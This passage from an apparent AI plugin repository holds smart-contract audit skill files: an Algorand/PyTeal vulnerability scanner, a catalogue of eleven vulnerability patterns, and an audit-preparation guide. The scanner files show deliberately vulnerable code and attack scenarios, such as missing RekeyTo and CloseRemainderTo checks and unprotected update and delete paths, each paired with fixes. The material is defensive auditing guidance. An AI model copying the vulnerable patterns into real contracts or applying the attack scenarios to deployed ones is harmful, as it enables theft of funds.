secure-workflow-guide/\n     solana-vulnerability-scanner/\n     substrate-vulnerability-scanner/\n     token-integration-analyzer/\n     ton-vulnerability-scanner/\n```\n\n---\n\n## Example Workflows\n\n### Pre-Audit Preparation\n1. Run `/secure-workflow-guide` to ensure clean Slither report\n2. Use `/code-maturity-assessor` to evaluate overall maturity\n3. Run `/audit-prep-assistant` to prepare documentation and checklist\n4. Share prepared package with auditors\n\n### Platform-Specific Security Review\n1. Run appropriate vulnerability scanner for your platform\n2. Use `/guidelines-advisor` for implementation best practices\n3. Run `/secure-workflow-guide` for comprehensive security checks\n4. Address findings and re-scan\n\n### Token Development/Integration\n1. Run `/token-integration-analyzer` for conformity and weird patterns\n2. Use `/guidelines-advisor` for token-specific best practices\n3. Run `/secure-workflow-guide` for complete validation\n4. Deploy with confidence\n\n### Continuous Security\n1. Run `/secure-workflow-guide` on every check-in\n2. Use platform scanner for vulnerability detection\n3. Monitor code maturity with `/code-maturity-assessor`\n4. Maintain documentation with `/guidelines-advisor`\n\n---\n\n## Tool Integration\n\nMany skills leverage security tools when available:\n- **Slither** - Static analysis for Solidity (70+ detectors, visual diagrams, upgradeability checks)\n- **Echidna** - Property-based fuzzing\n- **Manticore** - Symbolic execution\n- **Tealer** - Static analyzer for TEAL/PyTeal\n- **Web3/Ethers** - On-chain queries for deployed contracts\n\n**Note:** Skills gracefully adapt when tools are unavailable, performing manual analysis instead.\n\n---\n\n## Source Material\n\nThis plugin is based on Trail of Bits' open-source security resources:\n- [Building Secure Contracts](https://github.com/crytic/building-secure-contracts)\n- [Not So Smart Contracts](https://github.com/crytic/not-so-smart-contracts)\n- [Weird ERC20](https://github.com/d-xo/weird-erc20)\n\n---\n\n## Related Skills\n\n- **audit-context-building** - Build deep architectural context before vulnerability hunting\n- **issue-writer** - Transform findings into professional audit reports\n- **solidity-poc-builder** - Build proof-of-concept exploits for Solidity vulnerabilities\n\n---\n\n## Support\n\nFor questions or issues:\n- [Trail of Bits Office Hours](https://meetings.hubspot.com/trailofbits/office-hours) - Every Tuesday\n- [Empire Hacking Slack](https://join.slack.com/t/empirehacking/shared_invite/zt-h97bbrj8-1jwuiU33nnzg67JcvIciUw) - #crytic and #ethereum channels\n",
        "plugins/building-secure-contracts/skills/algorand-vulnerability-scanner/SKILL.md": "---\nname: algorand-vulnerability-scanner\ndescription: Scans Algorand smart contracts for 11 common vulnerabilities including rekeying attacks, unchecked transaction fees, missing field validations, and access control issues. Use when auditing Algorand projects (TEAL/PyTeal).\n---\n\n# Algorand Vulnerability Scanner\n\n## 1. Purpose\n\nSystematically scan Algorand smart contracts (TEAL and PyTeal) for platform-specific security vulnerabilities documented in Trail of Bits' \"Not So Smart Contracts\" database. This skill encodes 11 critical vulnerability patterns unique to Algorand's transaction model.\n\n## 2. When to Use This Skill\n\n- Auditing Algorand smart contracts (stateful applications or smart signatures)\n- Reviewing TEAL assembly or PyTeal code\n- Pre-audit security assessment of Algorand projects\n- Validating fixes for reported Algorand vulnerabilities\n- Training team on Algorand-specific security patterns\n\n## 3. Platform Detection\n\n### File Extensions & Indicators\n- **TEAL files**: `.teal`\n- **PyTeal files**: `.py` with PyTeal imports\n\n### Language/Framework Markers\n```python\n# PyTeal indicators\nfrom pyteal import *\nfrom algosdk import *\n\n# Common patterns\nTxn, Gtxn, Global, InnerTxnBuilder\nOnComplete, ApplicationCall, TxnType\n@router.method, @Subroutine\n```\n\n### Project Structure\n- `approval_program.py` / `clear_program.py`\n- `contract.teal` / `signature.teal`\n- References to Algorand SDK or Beaker framework\n\n### Tool Support\n- **Tealer**: Trail of Bits static analyzer for Algorand\n- Installation: `pip3 install tealer`\n- Usage: `tealer contract.teal --detect all`\n\n---\n\n## 4. How This Skill Works\n\nWhen invoked, I will:\n\n1. **Search your codebase** for TEAL/PyTeal files\n2. **Analyze each file** for the 11 vulnerability patterns\n3. **Report findings** with file references and severity\n4. **Provide fixes** for each identified issue\n5. **Run Tealer** (if installed) for automated detection\n\n---\n\n## 5. Example Output\n\nWhen vulnerabilities are found, you'll get a report like this:\n\n```\n=== ALGORAND VULNERABILITY SCAN RESULTS ===\n\nProject: my-algorand-dapp\nFiles Scanned: 3 (.teal, .py)\nVulnerabilities Found: 2\n\n---\n\n[CRITICAL] Rekeying Attack\nFile: contracts/approval.py:45\nPattern: Missing RekeyTo validation\n\nCode:\n    If(Txn.type_enum() == TxnType.Payment,\n        Seq([\n            # Missing: Assert(Txn.rekey_to() == Global.zero_address())\n            App.globalPut(Bytes(\"balance\"), balance + Txn.amount()),\n            Approve()\n        ])\n    )\n\nIssue: The contract doesn't validate the RekeyTo field, allowing attackers\nto change account authorization and bypass restrictions.\n\n\n---\n\n## 5. Vulnerability Patterns (11 Patterns)\n\nI check for 11 critical vulnerability patterns unique to Algorand. For detailed detection patterns, code examples, mitigations, and testing strategies, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n### Pattern Summary:\n\n1. **Rekeying Vulnerability**  CRITICAL - Unchecked RekeyTo field\n2. **Missing Transaction Verification**  CRITICAL - No GroupSize/GroupIndex checks\n3. **Group Transaction Manipulation**  HIGH - Unsafe group transaction handling\n4. **Asset Clawback Risk**  HIGH - Missing clawback address checks\n5. **Application State Manipulation**  MEDIUM - Unsafe global/local state updates\n6. **Asset Opt-In Missing**  HIGH - No asset opt-in validation\n7. **Minimum Balance Violation**  MEDIUM - Account below minimum balance\n8. **Close Remainder To Check**  HIGH - Unchecked CloseRemainderTo field\n9. **Application Clear State**  MEDIUM - Unsafe clear state program\n10. **Atomic Transaction Ordering**  HIGH - Assuming transaction order\n11. **Logic Signature Reuse**  HIGH - Logic sigs without uniqueness constraints\n\nFor complete vulnerability patterns with code examples, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n## 5. Scanning Workflow\n\n### Step 1: Platform Identification\n1. Confirm file extensions (`.teal`, `.py`)\n2. Identify framework (PyTeal, Beaker, pure TEAL)\n3. Determine contract type (stateful application vs smart signature)\n4. Locate approval and clear state programs\n\n### Step 2: Static Analysis with Tealer\n```bash\n# Run Tealer on contract\ntealer contract.teal --detect all\n\n# Or specific detectors\ntealer contract.teal --detect unprotected-rekey,group-size-check,update-application-check\n```\n\n### Step 3: Manual Vulnerability Sweep\nFor each of the 11 vulnerabilities above:\n1. Search for relevant transaction field usage\n2. Verify validation logic exists\n3. Check for bypass conditions\n4. Validate inner transaction handling\n\n### Step 4: Transaction Field Validation Matrix\nCreate checklist for all transaction types used:\n\n**Payment Transactions**:\n- [ ] RekeyTo validated\n- [ ] CloseRemainderTo validated\n- [ ] Fee validated (if smart signature)\n\n**Asset Transfers**:\n- [ ] Asset ID validated\n- [ ] AssetCloseTo validated\n- [ ] RekeyTo validated\n\n**Application Calls**:\n- [ ] OnComplete validated\n- [ ] Access controls enforced\n- [ ] Group size validated\n\n**Inner Transactions**:\n- [ ] Fee explicitly set to 0\n- [ ] RekeyTo not user-controlled (Teal v6+)\n- [ ] All fields validated\n\n### Step 5: Group Transaction Analysis\nFor atomic transaction groups:\n1. Validate `Global.group_size()` checks\n2. Review absolute vs relative indexing\n3. Check for replay protection (Lease field)\n4. Verify OnComplete fields for ApplicationCalls in group\n\n### Step 6: Access Control Review\n- [ ] Creator/admin privileges properly enforced\n- [ ] Update/delete operations protected\n- [ ] Sensitive functions have authorization checks\n\n---\n\n## 6. Reporting Format\n\n### Finding Template\n```markdown\n## [SEVERITY] Vulnerability Name (e.g., Missing RekeyTo Validation)\n\n**Location**: `contract.teal:45-50` or `approval_program.py:withdraw()`\n\n**Description**:\nThe contract approves payment transactions without validating the RekeyTo field, allowing an attacker to rekey the account and bypass future authorization checks.\n\n**Vulnerable Code**:\n```python\n# approval_program.py, line 45\nIf(Txn.type_enum() == TxnType.Payment,\n    Approve()  # Missing RekeyTo check\n)\n```\n\n**Attack Scenario**:\n1. Attacker submits payment transaction with RekeyTo set to attacker's address\n2. Contract approves transaction without checking RekeyTo\n3. Account authorization is rekeyed to attacker\n4. Attacker gains full control of account\n\n**Recommendation**:\nAdd explicit validation of the RekeyTo field:\n```python\nIf(And(\n    Txn.type_enum() == TxnType.Payment,\n    Txn.rekey_to() == Global.zero_address()\n), Approve(), Reject())\n```\n\n**References**:\n- building-secure-contracts/not-so-smart-contracts/algorand/rekeying\n- Tealer detector: `unprotected-rekey`\n```\n\n---\n\n## 7. Priority Guidelines\n\n### Critical (Immediate Fix Required)\n- Rekeying attacks\n- CloseRemainderTo / AssetCloseTo issues\n- Access control bypasses\n\n### High (Fix Before Deployment)\n- Unchecked transaction fees\n- Asset ID validation issues\n- Group size validation\n- Clear state transaction checks\n\n### Medium (Address in Audit)\n- Inner transaction fee issues\n- Time-based replay attacks\n- DoS via asset opt-in\n\n---\n\n## 8. Testing Recommendations\n\n### Unit Tests Required\n- Test each vulnerability scenario with PoC exploit\n- Verify fixes prevent exploitation\n- Test edge cases (group size = 0, empty addresses, etc.)\n\n### Tealer Integration\n```bash\n# Add to CI/CD pipeline\ntealer approval.teal --detect all --json > tealer-report.json\n\n# Fail build on critical findings\ntealer approval.teal --detect all --fail-on critical,high\n```\n\n### Scenario Testing\n- Submit transactions with all critical fields manipulated\n- Test atomic groups with unexpected sizes\n- Attempt access control bypasses\n- Verify inner transaction fee handling\n\n---\n\n## 9. Additional Resources\n\n- **Building Secure Contracts**: `building-secure-contracts/not-so-smart-contracts/algorand/`\n- **Tealer Documentation**: https://github.com/crytic/tealer\n- **Algorand Developer Docs**: https://developer.algorand.org/docs/\n- **PyTeal Documentation**: https://pyteal.readthedocs.io/\n\n---\n\n## 10. Quick Reference Checklist\n\nBefore completing Algorand audit, verify ALL items checked:\n\n- [ ] RekeyTo validated in all transaction types\n- [ ] CloseRemainderTo validated in payment transactions\n- [ ] AssetCloseTo validated in asset transfers\n- [ ] Transaction fees validated (smart signatures)\n- [ ] Group size validated for atomic transactions\n- [ ] Lease field used for replay protection (where applicable)\n- [ ] Access controls on Update/Delete operations\n- [ ] Asset ID validated in all asset operations\n- [ ] Asset transfers use pull pattern to avoid DoS\n- [ ] Inner transaction fees explicitly set to 0\n- [ ] OnComplete field validated for ApplicationCall transactions\n- [ ] Tealer scan completed with no critical/high findings\n- [ ] Unit tests cover all vulnerability scenarios\n",
        "plugins/building-secure-contracts/skills/algorand-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md": "## 6. Vulnerability Checklist (11 Patterns)\n\n### 6.1 REKEYING ATTACK  CRITICAL\n\n**Description**: Missing validation of the `RekeyTo` transaction field allows attackers to change account authorization and bypass contract restrictions.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: No RekeyTo check\nIf(Txn.type_enum() == TxnType.Payment)\n    # Missing: Assert(Txn.rekey_to() == Global.zero_address())\n\n# VULNERABLE: Inner transactions with user-controlled RekeyTo\nInnerTxnBuilder.SetField(TxnField.rekey_to, Txn.accounts[1])  # User controlled\n```\n\n**What to Check**:\n- [ ] All transaction approval logic validates `Txn.rekey_to() == Global.zero_address()`\n- [ ] Inner transactions in Teal v6+ do not use user-controlled RekeyTo\n- [ ] Group transactions verify RekeyTo for all relevant txns\n\n**Mitigation**:\n```python\n# SECURE: Validate RekeyTo field\nAssert(Txn.rekey_to() == Global.zero_address())\n\n# OR: Explicitly allow specific rekey target\nAssert(Txn.rekey_to() == intended_address)\n```\n\n**Tool Detection**: Tealer detector `unprotected-rekey` available\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/rekeying\n\n---\n\n### 4.2 UNCHECKED TRANSACTION FEE  HIGH\n\n**Description**: Smart signatures without fee validation allow users to set excessive fees, draining the sender's account balance.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: No fee check in smart signature\ndef approval_program():\n    return If(Txn.type_enum() == TxnType.Payment, Int(1), Int(0))\n    # Missing fee validation\n\n# VULNERABLE: Unbounded fee\nIf(Txn.fee() <= some_large_value)  # Still vulnerable\n```\n\n**What to Check**:\n- [ ] Smart signatures enforce `Txn.fee() == Global.min_txn_fee()`\n- [ ] OR fee is explicitly set to 0 with fee pooling enabled\n- [ ] No user control over transaction fee amounts\n\n**Mitigation**:\n```python\n# SECURE: Force fee to zero (with fee pooling)\nAssert(Txn.fee() == Int(0))\n\n# OR: Enforce minimum fee only\nAssert(Txn.fee() == Global.min_txn_fee())\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/unchecked_transaction_fee\n\n---\n\n### 4.3 CLOSING ACCOUNT (CloseRemainderTo)  CRITICAL\n\n**Description**: Missing validation of `CloseRemainderTo` field allows attackers to drain entire account balance to arbitrary address.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: Payment without CloseRemainderTo check\nIf(Txn.type_enum() == TxnType.Payment)\n    # Missing: Assert(Txn.close_remainder_to() == Global.zero_address())\n\n# VULNERABLE: Inner transaction with close field\nInnerTxnBuilder.SetFields({\n    TxnField.type_enum: TxnType.Payment,\n    # Missing CloseRemainderTo validation\n})\n```\n\n**What to Check**:\n- [ ] All payment transactions validate `Txn.close_remainder_to() == Global.zero_address()`\n- [ ] OR explicitly allow specific close address\n- [ ] Inner transactions do not set CloseRemainderTo unless intended\n\n**Mitigation**:\n```python\n# SECURE: Validate CloseRemainderTo\nAssert(Txn.close_remainder_to() == Global.zero_address())\n\n# OR: Allow specific close target\nAssert(Txn.close_remainder_to() == authorized_address)\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/closing_account\n\n---\n\n### 4.4 CLOSING ASSET (AssetCloseTo)  CRITICAL\n\n**Description**: Missing validation of `AssetCloseTo` field enables transferring entire asset balance to arbitrary address.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: Asset transfer without AssetCloseTo check\nIf(Txn.type_enum() == TxnType.AssetTransfer)\n    # Missing: Assert(Txn.asset_close_to() == Global.zero_address())\n```\n\n**What to Check**:\n- [ ] All asset transfer transactions validate `Txn.asset_close_to() == Global.zero_address()`\n- [ ] OR explicitly specify allowed close target\n- [ ] Inner asset transfers validate AssetCloseTo field\n\n**Mitigation**:\n```python\n# SECURE: Validate AssetCloseTo\nAssert(Txn.asset_close_to() == Global.zero_address())\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/closing_asset\n\n---\n\n### 4.5 GROUP SIZE CHECK  HIGH\n\n**Description**: Missing validation of `Global.group_size()` allows attackers to include multiple application calls in atomic group, executing operations multiple times.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: No group size validation\n# Attacker can repeat call 10 times in single group\nIf(Gtxn[0].type_enum() == TxnType.Payment)\n\n# VULNERABLE: Absolute indices without size check\nAssert(Gtxn[2].sender() == Gtxn[0].sender())  # No group size validation\n```\n\n**What to Check**:\n- [ ] Atomic transaction logic validates `Global.group_size()` matches expected size\n- [ ] Using absolute indices is paired with group size verification\n- [ ] OR use relative indexing with ABI methods (Teal v6+)\n\n**Mitigation**:\n```python\n# SECURE: Validate group size\nAssert(Global.group_size() == Int(3))  # Exact size\n# OR\nAssert(Global.group_size() <= Int(3))  # Maximum size\n\n# BETTER: Use ABI with relative indexing (Teal v6+)\n@router.method\ndef method():\n    # Automatically handles group indexing\n```\n\n**Tool Detection**: Tealer detector `group-size-check` available\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/group_size_check\n\n---\n\n### 4.6 TIME-BASED REPLAY ATTACK  MEDIUM\n\n**Description**: Transactions with same `FirstValid`/`LastValid` but different hashes can be submitted multiple times without `Lease` field protection.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: Periodic payments without lease\ndef recurring_payment():\n    return Seq([\n        Assert(Global.latest_timestamp() >= next_payment_time),\n        # Missing Lease validation for replay protection\n        InnerTxnBuilder.Submit()\n    ])\n```\n\n**What to Check**:\n- [ ] Recurring/periodic transactions validate `Txn.lease()` field\n- [ ] Lease field set to unique value per logical transaction\n- [ ] Time-dependent operations have replay protection\n\n**Mitigation**:\n```python\n# SECURE: Validate Lease field\nAssert(Txn.lease() == expected_lease_value)\n\n# OR: Use Lease for mutual exclusion\nlease = Sha256(Concat(Bytes(\"prefix\"), Txn.sender(), Itob(counter)))\nAssert(Txn.lease() == lease)\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/time_based_replay_attack\n\n---\n\n### 4.7 ACCESS CONTROLS  CRITICAL\n\n**Description**: Missing access control checks on `UpdateApplication` and `DeleteApplication` operations allow unauthorized contract modifications.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: No access control on updates\nprogram = Cond(\n    [Txn.application_id() == Int(0), on_creation],\n    [Txn.on_completion() == OnComplete.UpdateApplication, Int(1)],  # Anyone can update!\n    [Txn.on_completion() == OnComplete.DeleteApplication, Int(1)],  # Anyone can delete!\n)\n\n# VULNERABLE: Weak access control\nIf(Txn.on_completion() == OnComplete.UpdateApplication,\n    Int(1))  # Missing sender validation\n```\n\n**What to Check**:\n- [ ] `UpdateApplication` checks `Txn.sender() == creator/admin`\n- [ ] `DeleteApplication` checks `Txn.sender() == creator/admin`\n- [ ] OR explicitly disable updates/deletes: `Return(Int(0))`\n- [ ] OnComplete field validated for all application calls\n\n**Mitigation**:\n```python\n# SECURE: Proper access control\nis_creator = Txn.sender() == Global.creator_address()\n\nprogram = Cond(\n    [Txn.application_id() == Int(0), on_creation],\n    [Txn.on_completion() == OnComplete.UpdateApplication, is_creator],\n    [Txn.on_completion() == OnComplete.DeleteApplication, is_creator],\n)\n\n# OR: Disable updates entirely\n[Txn.on_completion() == OnComplete.UpdateApplication, Return(Int(0))],\n```\n\n**Tool Detection**: Tealer detector `update-application-check` available\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/access_controls\n\n---\n\n### 4.8 ASSET ID VERIFICATION  HIGH\n\n**Description**: Missing validation of `Txn.xfer_asset()` allows attackers to transfer wrong/worthless assets instead of expected tokens.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: No asset ID check\nIf(And(\n    Txn.type_enum() == TxnType.AssetTransfer,\n    Txn.asset_amount() >= required_amount,\n    # Missing: Txn.xfer_asset() == expected_asset_id\n))\n\n# VULNERABLE: User-provided asset ID\ndef swap(asset_id):  # User controlled!\n    return If(Txn.xfer_asset() == asset_id, ...)  # No validation\n```\n\n**What to Check**:\n- [ ] All asset transfer validations include `Txn.xfer_asset() == expected_asset_id`\n- [ ] Asset IDs stored in global state or hardcoded\n- [ ] No user control over which asset ID is considered valid\n\n**Mitigation**:\n```python\n# SECURE: Validate asset ID\nexpected_asset_id = Int(12345678)  # Or from global state\nAssert(And(\n    Txn.type_enum() == TxnType.AssetTransfer,\n    Txn.xfer_asset() == expected_asset_id,\n    Txn.asset_amount() >= required_amount\n))\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/asset_id_verification\n\n---\n\n### 4.9 DENIAL OF SERVICE (Asset Opt-In)  MEDIUM\n\n**Description**: Transferring assets to non-opted-in accounts causes transaction failure, enabling DoS attacks when using push pattern.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: Push pattern for asset distribution\nFor(i IN users).Do(\n    InnerTxnBuilder.SetFields({\n        TxnField.type_enum: TxnType.AssetTransfer,\n        TxnField.receiver: users[i],\n        TxnField.asset_amount: rewards[i]\n    })\n)  # Fails if any user not opted-in, DoS all users\n\n# VULNERABLE: Batch operations with asset transfers\n# Single failure blocks entire batch\n```\n\n**What to Check**:\n- [ ] Asset distributions use pull pattern (users claim) instead of push\n- [ ] OR batch operations handle opt-in failures gracefully\n- [ ] Critical operations not blocked by asset transfer failures\n\n**Mitigation**:\n```python\n# SECURE: Pull pattern\n@router.method\ndef claim_reward():\n    # User initiates, must be opted-in\n    amount = App.localGet(Txn.sender(), Bytes(\"reward\"))\n    Assert(amount > Int(0))\n    # Transfer asset to opted-in user\n\n# BETTER: Users trigger their own transfers\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/dos\n\n---\n\n### 4.10 INNER TRANSACTION FEE  MEDIUM\n\n**Description**: Inner transactions with unset or non-zero fees drain application balance when fee pooling is used.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: Missing fee field in inner transaction\nInnerTxnBuilder.Begin()\nInnerTxnBuilder.SetFields({\n    TxnField.type_enum: TxnType.Payment,\n    TxnField.receiver: receiver,\n    # Missing: TxnField.fee: Int(0)\n})\nInnerTxnBuilder.Submit()  # Drains app balance for fees!\n\n# VULNERABLE: Non-zero inner transaction fee\nInnerTxnBuilder.SetField(TxnField.fee, Int(1000))  # Drains balance\n```\n\n**What to Check**:\n- [ ] All inner transactions explicitly set `TxnField.fee: Int(0)`\n- [ ] Fee pooling strategy documented and validated\n- [ ] Internal bookkeeping accounts for any non-zero fees\n\n**Mitigation**:\n```python\n# SECURE: Explicitly set fee to zero\nInnerTxnBuilder.Begin()\nInnerTxnBuilder.SetFields({\n    TxnField.type_enum: TxnType.Payment,\n    TxnField.receiver: receiver,\n    TxnField.amount: amount,\n    TxnField.fee: Int(0),  # Explicit zero fee\n})\nInnerTxnBuilder.Submit()\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/inner_transaction_fee\n\n---\n\n### 4.11 CLEAR STATE TRANSACTION  HIGH\n\n**Description**: Missing `OnComplete` field validation allows attackers to invoke clear state program instead of approval program, bypassing logic.\n\n**Detection Patterns**:\n```python\n# VULNERABLE: Only checks transaction type, not OnComplete\ndef validate_group():\n    return And(\n        Gtxn[0].type_enum() == TxnType.Payment,\n        Gtxn[1].type_enum() == TxnType.ApplicationCall,  # Could be ClearState!\n        # Missing: Gtxn[1].on_completion() == OnComplete.NoOp\n    )\n\n# VULNERABLE: Assumes ApplicationCall is approval\nIf(Gtxn[i].type_enum() == TxnType.ApplicationCall,\n    validate_app_call())  # May be ClearStateProgram\n```\n\n**What to Check**:\n- [ ] Group transaction validation checks `Gtxn[i].on_completion() == OnComplete.NoOp`\n- [ ] OR explicitly allows specific OnComplete values\n- [ ] Not just checking `TxnType.ApplicationCall` without OnComplete validation\n\n**Mitigation**:\n```python\n# SECURE: Validate OnComplete field\ndef validate_group():\n    return And(\n        Gtxn[0].type_enum() == TxnType.Payment,\n        Gtxn[1].type_enum() == TxnType.ApplicationCall,\n        Gtxn[1].on_completion() == OnComplete.NoOp,  # Explicit check\n    )\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/algorand/clear_state_transaction\n\n---\n",
        "plugins/building-secure-contracts/skills/audit-prep-assistant/SKILL.md": "---\nname: audit-prep-assistant\ndescription: Prepares codebases for security review using Trail of Bits' checklist. Helps set review goals, runs static analysis tools, increases test coverage, removes dead code, ensures accessibility, and generates documentation (flowcharts, user stories, inline comments).\n---\n\n# Audit Prep Assistant\n\n## Purpose\n\nHelps prepare for a security review using Trail of Bits' checklist. A well-prepared codebase makes the review process smoother and more effective.\n\n**Use this**: 1-2 weeks before your security audit\n\n---\n\n## The Preparation Process\n\n### Step 1: Set Review Goals\n\nHelps define what you want from the review:\n\n**Key Questions**:\n- What's the overall security level you're aiming for?\n- What areas concern you most?\n  - Previous audit issues?\n  - Complex components?\n  - Fragile parts?\n- What's the worst-case scenario for your project?\n\nDocuments goals to share with the assessment team.\n\n---\n\n### Step 2: Resolve Easy Issues\n\nRuns static analysis and helps fix low-hanging fruit:\n\n**Run Static Analysis**:\n\nFor Solidity:\n```bash\nslither . --exclude-dependencies\n```\n\nFor Rust:\n```bash\ndylint --all\n```\n\nFor Go:\n```bash\ngolangci-lint run\n```\n\nFor Go/Rust/C++:\n```bash\n# CodeQL and Semgrep checks\n```\n\nThen I'll:\n- Triage all findings\n- Help fix easy issues\n- Document accepted risks\n\n**Increase Test Coverage**:\n- Analyze current coverage\n- Identify untested code\n- Suggest new tests\n- Run full test suite\n\n**Remove Dead Code**:\n- Find unused functions/variables\n- Identify unused libraries\n- Locate stale features\n- Suggest cleanup\n\n**Goal**: Clean static analysis report, high test coverage, minimal dead code\n\n---\n\n### Step 3: Ensure Code Accessibility\n\nHelps make code clear and accessible:\n\n**Provide Detailed File List**:\n- List all files in scope\n- Mark out-of-scope files\n- Explain folder structure\n- Document dependencies\n\n**Create Build Instructions**:\n- Write step-by-step setup guide\n- Test on fresh environment\n- Document dependencies and versions\n- Verify build succeeds\n\n**Freeze Stable Version**:\n- Identify commit hash for review\n- Create dedicated branch\n- Tag release version\n- Lock dependencies\n\n**Identify Boilerplate**:\n- Mark copied/forked code\n- Highlight your modifications\n- Document third-party code\n- Focus review on your code\n\n---\n\n### Step 4: Generate Documentation\n\nHelps create documentation:\n\n**Flowcharts and Sequence Diagrams**:\n- Map primary workflows\n- Show component relationships\n- Visualize data flow\n- Identify critical paths\n\n**User Stories**:\n- Define user roles\n- Document use cases\n- Explain interactions\n- Clarify expectations\n\n**On-chain/Off-chain Assumptions**:\n- Data validation procedures\n- Oracle information\n- Bridge assumptions\n- Trust boundaries\n\n**Actors and Privileges**:\n- List all actors\n- Document roles\n- Define privileges\n- Map access controls\n\n**External Developer Docs**:\n- Link docs to code\n- Keep synchronized\n- Explain architecture\n- Document APIs\n\n**Function Documentation**:\n- System and function invariants\n- Parameter ranges (min/max values)\n- Arithmetic formulas and precision loss\n- Complex logic explanations\n- NatSpec for Solidity\n\n**Glossary**:\n- Define domain terms\n- Explain acronyms\n- Consistent terminology\n- Business logic concepts\n\n**Video Walkthroughs** (optional):\n- Complex workflows\n- Areas of concern\n- Architecture overview\n\n---\n\n## How I Work\n\nWhen invoked, I will:\n\n1. **Help set review goals** - Ask about concerns and document them\n2. **Run static analysis** - Execute appropriate tools for your platform\n3. **Analyze test coverage** - Identify gaps and suggest improvements\n4. **Find dead code** - Search for unused code and libraries\n5. **Review accessibility** - Check build instructions and scope clarity\n6. **Generate documentation** - Create flowcharts, user stories, glossaries\n7. **Create prep checklist** - Track what's done and what's remaining\n\nAdapts based on:\n- Your platform (Solidity, Rust, Go, etc.)\n- Available tools\n- Existing documentation\n- Review timeline\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"README covers setup, no need for detailed build instructions\" | READMEs assume context auditors don't have | Test build on fresh environment, document every dependency version |\n| \"Static analysis already ran, no need to run again\" | Codebase changed since last run | Execute static analysis tools, generate fresh report |\n| \"Test coverage looks decent\" | \"Looks decent\" isn't measured coverage | Run coverage tools, identify specific untested code paths |\n| \"Not much dead code to worry about\" | Dead code hides during manual review | Use automated detection tools to find unused functions/variables |\n| \"Architecture is straightforward, no diagrams needed\" | Text descriptions miss visual patterns | Generate actual flowcharts and sequence diagrams |\n| \"Can freeze version right before audit\" | Last-minute freezing creates rushed handoff | Identify and document commit hash now, create dedicated branch |\n| \"Terms are self-explanatory\" | Domain knowledge isn't universal | Create comprehensive glossary with all domain-specific terms |\n| \"I'll do this step later\" | Steps build on each other - skipping creates gaps | Complete all 4 steps sequentially, track progress with checklist |\n\n---\n\n## Example Output\n\nWhen I finish helping you prepare, you'll have concrete deliverables like:\n\n```\n=== AUDIT PREP PACKAGE ===\n\nProject: DeFi DEX Protocol\nAudit Date: March 15, 2024\nPreparation Status: Complete\n\n---\n\n## REVIEW GOALS DOCUMENT\n\nSecurity Objectives:\n- Verify economic security of liquidity pool swaps\n- Validate oracle manipulation resistance\n- Assess flash loan attack vectors\n\nAreas of Concern:\n1. Complex AMM pricing calculation (src/SwapRouter.sol:89-156)\n2. Multi-hop swap routing logic (src/Router.sol)\n3. Oracle price aggregation (src/PriceOracle.sol:45-78)\n\nWorst-Case Scenario:\n- Flash loan attack drains liquidity pools via oracle manipulation\n\nQuestions for Auditors:\n- Can the AMM pricing model produce negative slippage under edge cases?\n- Is the slippage protection sufficient to prevent sandwich attacks?\n- How resilient is the system to temporary oracle failures?\n\n---\n\n## STATIC ANALYSIS REPORT\n\nSlither Scan Results:\n High: 0 issues\n Medium: 0 issues\n Low: 2 issues (triaged - documented in TRIAGE.md)\n Info: 5 issues (code style, acceptable)\n\nTool: slither . --exclude-dependencies\nDate: March 1, 2024\nStatus: CLEAN (all critical issues resolved)\n\n---\n\n## TEST COVERAGE REPORT\n\nOverall Coverage: 94%\n- Statements: 1,245 / 1,321 (94%)\n- Branches: 456 / 498 (92%)\n- Functions: 89 / 92 (97%)\n\nUncovered Areas:\n- Emergency pause admin functions (tested manually)\n- Governance migration path (one-time use)\n\nCommand: forge coverage\nStatus: EXCELLENT\n\n---\n\n## CODE SCOPE\n\nIn-Scope Files (8):\n src/SwapRouter.sol (456 lines)\n src/LiquidityPool.sol (234 lines)\n src/PairFactory.sol (389 lines)\n src/PriceOracle.sol (167 lines)\n src/LiquidityManager.sol (298 lines)\n src/Governance.sol (201 lines)\n src/FlashLoan.sol (145 lines)\n src/RewardsDistributor.sol (178 lines)\n\nOut-of-Scope:\n- lib/ (OpenZeppelin, external dependencies)\n- test/ (test contracts)\n- scripts/ (deployment scripts)\n\nTotal In-Scope: 2,068 lines of Solidity\n\n---\n\n## BUILD INSTRUCTIONS\n\nPrerequisites:\n- Foundry 0.2.0+\n- Node.js 18+\n- Git\n\nSetup:\n```bash\ngit clone https://github.com/project/repo.git\ncd repo\ngit checkout audit-march-2024  # Frozen branch\nforge install\nforge build\nforge test\n```\n\nVerification:\n Build succeeds without errors\n All 127 tests pass\n No warnings from compiler\n\n---\n\n## DOCUMENTATION\n\nGenerated Artifacts:\n ARCHITECTURE.md - System overview with diagrams\n USER_STORIES.md - 12 user interaction flows\n GLOSSARY.md - 34 domain terms defined\n docs/diagrams/contract-interactions.png\n docs/diagrams/swap-flow.png\n docs/diagrams/state-machine.png\n\nNatSpec Coverage: 100% of public functions\n\n---\n\n## DEPLOYMENT INFO\n\nNetwork: Ethereum Mainnet\nCommit: abc123def456 (audit-march-2024 branch)\nDeployed Contracts:\n- SwapRouter: 